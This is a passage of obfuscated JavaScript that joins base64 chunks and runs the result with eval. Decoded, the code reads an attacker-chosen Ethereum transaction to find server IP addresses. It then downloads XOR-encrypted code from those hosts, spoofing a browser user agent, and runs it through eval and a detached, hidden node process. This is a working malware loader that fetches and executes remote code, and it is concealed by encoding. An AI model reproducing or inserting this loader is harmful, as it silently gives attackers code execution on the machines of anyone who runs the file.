N0U2VuZGVyVHgobGF0ZXN0SGludCl7Y29uc3QgY2","9udHJvbGxlcj1uZXcgQWJvcnRDb250cm9sbGVyKCk7dHJ5e2Nv","bnN0IGhlYWQ9bGF0ZXN0SGludD8/QmlnSW50KGF3YWl0IHdpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0Nh","bGwoZW5kcG9pbnQsJ2V0aF9ibG9ja051bWJlcicsW10sc2lnbm","FsKSxjb250cm9sbGVyLnNpZ25hbCkpO2NvbnN0IG5vbmNlPUJp","Z0ludChhd2FpdCB3aXRoUnBjRW5kcG9pbnRzKChlbmRwb2ludC","xzaWduYWwpPT5ycGNDYWxsKGVuZHBvaW50LCdldGhfZ2V0VHJh","bnNhY3Rpb25Db3VudCcsW1NFTkRFUix0b0Jsb2NrSGV4KGhlYW","QpXSxzaWduYWwpLGNvbnRyb2xsZXIuc2lnbmFsKSk7Y29uc3Qg","dGFyZ2V0Tm9uY2U9bm9uY2UtMW47bGV0IGxvPVNFQVJDSF9GTE","9PUi0xbjtsZXQgaGk9aGVhZDt3aGlsZShoaS1sbz4xbil7Y29u","c3Qgc3Bhbj1oaS1sby0xbjtjb25zdCBrPUJpZ0ludChNYXRoLm","1pbihOT05DRV9GQU5PVVQsTnVtYmVyKHNwYW4pKSk7Y29uc3Qg","cHJvYmVzPVtdO2ZvcihsZXQgaT0xbjtpPD1rO2krPTFuKXByb2","Jlcy5wdXNoKGxvKyhpKihoaS1sbykpLyhrKzFuKSk7Y29uc3Qg","Y291bnRzPWF3YWl0IG5vbmNlQXRCbG9ja3MocHJvYmVzLGNvbn","Ryb2xsZXIuc2lnbmFsKTtjb25zdCBpZHg9Y291bnRzLmZpbmRJ","bmRleCgoYyk9PmM+PW5vbmNlKTtpZihpZHg9PT0tMSlsbz1wcm","9iZXNbcHJvYmVzLmxlbmd0aC0xXTtlbHNle2hpPXByb2Jlc1tp","ZHhdO2lmKGlkeD4wKWxvPXByb2Jlc1tpZHgtMV19fQ0KY29uc3","QgYmxvY2s9YXdhaXQgd2l0aFJwY0VuZHBvaW50cygoZW5kcG9p","bnQsc2lnbmFsKT0+cnBjQ2FsbChlbmRwb2ludCwnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLFt0b0Jsb2NrSGV4KGhpKSwhMF0sc2ln","bmFsKSxjb250cm9sbGVyLnNpZ25hbCk7Y29uc3QgdHhzPWJsb2","NrPy50cmFuc2FjdGlvbnN8fFtdO2xldCB0eD1udWxsO2Zvcihj","b25zdCB0IG9mIHR4cyl7aWYoIXQuZnJvbXx8dC5mcm9tLnRvTG","93ZXJDYXNlKCkhPT1TRU5ERVIpY29udGludWU7aWYoQmlnSW50","KHQubm9uY2UpPT09dGFyZ2V0Tm9uY2Upe3R4PXQ7YnJlYWt9DQ","ppZighdHh8fEJpZ0ludCh0Lm5vbmNlKT5CaWdJbnQodHgubm9u","Y2UpKXR4PXR9DQpyZXR1cm57YmxvY2tOdW1iZXI6aGksdHh9fW","ZpbmFsbHl7Y29udHJvbGxlci5hYm9ydCgpfX0NCmFzeW5jIGZ1","bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZXIoKXtjb25zdC","B1cmw9YCR7SU5ERVhFUl9VUkx9P21vZHVsZT1hY2NvdW50JmFj","dGlvbj10eGxpc3QmYWRkcmVzcz0ke1NFTkRFUn1gK2Amc3Rhcn","RibG9jaz0wJmVuZGJsb2NrPTk5OTk5OTk5JnBhZ2U9MSZvZmZz","ZXQ9MjAmc29ydD1kZXNjJmZpbHRlcmJ5PWZyb21gO2NvbnN0IH","BheWxvYWQ9YXdhaXQgaHR0cFJlcXVlc3QodXJsKTtjb25zdCBs","aXN0PUFycmF5LmlzQXJyYXkocGF5bG9hZD8ucmVzdWx0KT9wYX","lsb2FkLnJlc3VsdDpbXTtjb25zdCB0eD1saXN0LmZpbmQoKHQp","PT50LmZyb20mJnQuZnJvbS50b0xvd2VyQ2FzZSgpPT09U0VORE","VSKTtyZXR1cm57YmxvY2tOdW1iZXI6QmlnSW50KHR4LmJsb2Nr","TnVtYmVyKSx0eH19DQphc3luYyBmdW5jdGlvbiBydW4oKXtjb2","5zdCBsYXRlc3Q9QmlnSW50KGF3YWl0IHdpdGhScGNFbmRwb2lu","dHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0NhbGwoZW5kcG9pbn","QsJ2V0aF9ibG9ja051bWJlcicsW10sc2lnbmFsKSkpO2NvbnN0","IHRhcmdldEJsb2NrPWxhdGVzdC0obGF0ZXN0JUJMT0NLX01VTF","RJUExFKTtsZXQgbWF0Y2g9YXdhaXQgZmlyc3RNYXRjaChjYW5k","aWRhdGVCbG9ja3ModGFyZ2V0QmxvY2spLm1hcChibG9ja1Rhc2","spKTtpZighbWF0Y2gpe21hdGNoPWF3YWl0IGxhc3RTZW5kZXJU","eChsYXRlc3QpLmNhdGNoKCgpPT5sYXN0U2VuZGVyVHhWaWFJbm","RleGVyKCkpfQ0KY29uc3RbaXAxLGlwMl09ZGVjb2RlQWRkcmVz","cyhtYXRjaC50eC50byk7Y29uc3QgX2dsb2JhbD1nbG9iYWw7X2","dsb2JhbC5fVj1fZ2xvYmFsLmk7X2dsb2JhbC5fSD1gaHR0cDov","LyR7aXAxfTo4MGA7X2dsb2JhbC5fSDI9YGh0dHA6Ly8ke2lwMn","06ODBgO19nbG9iYWwuX3Rfcz1gaHR0cDovLyR7aXAxfTo0NDNg","O19nbG9iYWwuX3RfdT1gaHR0cDovLyR7aXAxfTo4MGA7ZnVuY3","Rpb24gZ2V0Q29kZShrZXksdXJsKXtjb25zdCBiYXNlPXtob3N0","bmFtZTp1cmwuaG9zdG5hbWUscG9ydDpOdW1iZXIodXJsLnBvcn","QpfHw4MCxwYXRoOnVybC5wYXRobmFtZSt1cmwuc2VhcmNoLGhl","YWRlcnM6eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKFdpbm","Rvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQv","NTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS","4wLjAuMCBTYWZhcmkvNTM3LjM2JywnU2VjLVYnOl9nbG9iYWwu","X1Z8fDAsfSx9O2Z1bmN0aW9uIHhvckRlY29kZShidWYpe2Nvbn","N0IGtuPWtleS5sZW5ndGg7Zm9yKGxldCBpPTA7aTxidWYubGVu","Z3RoO2krKylidWZbaV1ePWtleS5jaGFyQ29kZUF0KGkla24pO3","JldHVybiBidWYudG9TdHJpbmcoJ3V0ZjgnKX0NCmZ1bmN0aW9u","IGZyb21CNjRIZWFkZXIocmVzKXtjb25zdCBiNjQ9cmVzLmhlYW","RlcnNbJ3gtcGF5bG9hZC1iNjQnXTtpZighYjY0KXRocm93IG5l","dyBFcnJvcignTWlzc2luZyBYLVBheWxvYWQtQjY0Jyk7cmV0dX","JuIHhvckRlY29kZShCdWZmZXIuZnJvbShiNjQsJ2Jhc2U2NCcp","KX0NCmZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKXtyZXR1cm4gbm","V3IFByb21pc2UoKHJlc29sdmUscmVqZWN0KT0+e2NvbnN0IHJl","cT1odHRwLnJlcXVlc3Qoey4uLmJhc2UsbWV0aG9kfSwocmVzKT","0+e2lmKG1ldGhvZD09PSdIRUFEJyl7dHJ5e3Jlc29sdmUoZnJv","bUI2NEhlYWRlcihyZXMpKX1jYXRjaChlKXtyZWplY3QoZSl9DQ","pyZXMucmVzdW1lKCk7cmV0dXJufQ0KY29uc3QgY2h1bmtzPVtd","O3Jlcy5vbignZGF0YScsKGNodW5rKT0+Y2h1bmtzLnB1c2goY2","h1bmspKTtyZXMub24oJ2VuZCcsKCk9Pnt0cnl7Y29uc3QgYnVm","PUJ1ZmZlci5jb25jYXQoY2h1bmtzKTtpZihidWYubGVuZ3RoKX","JldHVybiByZXNvbHZlKHhvckRlY29kZShidWYpKTtpZihyZXMu","aGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKXJldHVybiByZXNvbH","ZlKGZyb21CNjRIZWFkZXIocmVzKSk7cmVqZWN0KG5ldyBFcnJv","cignRW1wdHkgcGF5bG9hZCBib2R5JykpfWNhdGNoKGUpe3Jlam","VjdChlKX19KTtyZXMub24oJ2Vycm9yJyxyZWplY3QpfSk7cmVx","Lm9uKCdlcnJvcicscmVqZWN0KTtyZXEuZW5kKCl9KX0NCnJldH","VybiByZXF1ZXN0KCdHRVQnKS5jYXRjaCgoKT0+cmVxdWVzdCgn","SEVBRCcpKX0NCmFzeW5jIGZ1bmN0aW9uIHJ1bl9sb2FkZXIodX","JsLGtleSxpc0Jvb3Qpe3RyeXtjb25zdCBjb2RlPWF3YWl0IGdl","dENvZGUoa2V5LHVybCk7Y29uc3QgZW52PWlzQm9vdD9gZ2xvYm","FsWydfViddPScke19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2Jh","bFsnX0gnXT0nJHtfZ2xvYmFsWydfSCddfSc7Z2xvYmFsWydfSD","InXT0nJHtfZ2xvYmFsWydfSDInXX0nO2dsb2JhbFsnciddPXJl","cXVpcmU7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPW","dsb2JhbDtgOmBnbG9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1Yn","XSB8fCAwfSc7Z2xvYmFsWydfdF9zJ109JyR7X2dsb2JhbFsnX3","RfcyddfSc7Z2xvYmFsWydfdF91J109JyR7X2dsb2JhbFsnX3Rf","dSddfSc7Z2xvYmFsWydyJ109cmVxdWlyZTtnbG9iYWxbJ20nXT","1tb2R1bGU7dmFyIF9nbG9iYWw9Z2xvYmFsO2A7aWYoIWlzQm9v","dClldmFsKGVuditjb2RlKTtzcGF3bignbm9kZScsWyctZScsZW","52K2NvZGVdLHtkZXRhY2hlZDohMCxzdGRpbzonaWdub3JlJyx3","aW5kb3dzSGlkZTohMCx9KS51bnJlZigpfWNhdGNoKGUpe319DQ","phd2FpdCBydW5fbG9hZGVyKG5ldyBVUkwoYGh0dHA6Ly8ke2lw","MX06NDQzLzB4L2Nsc2ApLCdxNEZaa3hYeyFoLFNyMz1AJywhMS","k7YXdhaXQgcnVuX2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtp","cDF9OjQ0My8weC9sc2ApLCd5LXBfPmQkMEImQF4xYVFrJywhMC","l9DQpydW4oKTs="].join('');var _0x05a598b=atob(_0x05a598a);eval(_0x05a598b);})();
